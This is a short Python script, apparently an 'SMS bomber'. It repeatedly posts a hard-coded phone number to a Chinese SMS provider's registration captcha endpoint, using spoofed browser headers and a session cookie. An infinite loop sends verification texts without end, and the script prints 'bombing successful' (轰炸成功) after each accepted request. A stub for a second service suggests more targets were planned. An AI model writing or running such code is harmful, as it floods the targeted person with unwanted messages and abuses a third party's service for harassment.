import  requests
import json


def ZhenziYun(mobile):
    """
    榛子云发短信
    :param mobile:
    :return:
    """
    url = "http://sms_developer.zhenzikj.com/zhenzisms_user/register/getSmsCaptcha.html"
    headers={
                'Accept': 'application / json, text / javascript, * / *; q = 0.01',
                'Accept - Encoding': 'gzip, deflate',
                'Accept - Language': 'zh - CN, zh;',
                'q' : '0.9',
                'Connection': 'keep - alive',
                'Content - Length': '18',
                'Content - Type': 'application / x - www - form - urlencoded;charset= UTF - 8',
                'Cookie': "td_cookie =857091973;JSESSIONID = 185A8EB2581C8FBED3B7937138CCDC5A",
                'Host': 'sms_developer.zhenzikj.com',
                'Origin': 'http: // sms_developer.zhenzikj.com',
                'Referer': 'http: // sms_developer.zhenzikj.com / zhenzisms_user / register.html',
                'User - Agent': 'Mozilla / 5.0(WindowsNT10.0;Win64;x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 76.0.3809.100Safari / 537.36',
                'X - Requested - With': 'XMLHttpRequest'
    }
    data={
        'mobile':mobile
    }
    response = requests.post(url=url,data=data,headers=headers)
    res= json.loads(response.text)
    print(res)
    if res['code']==0:
        print("榛子云轰炸成功")
        return True
    return False

def WordJinLi(mobile):
    pass

if __name__=="__main__":
    while 1:
        ZhenziYun(18135123069)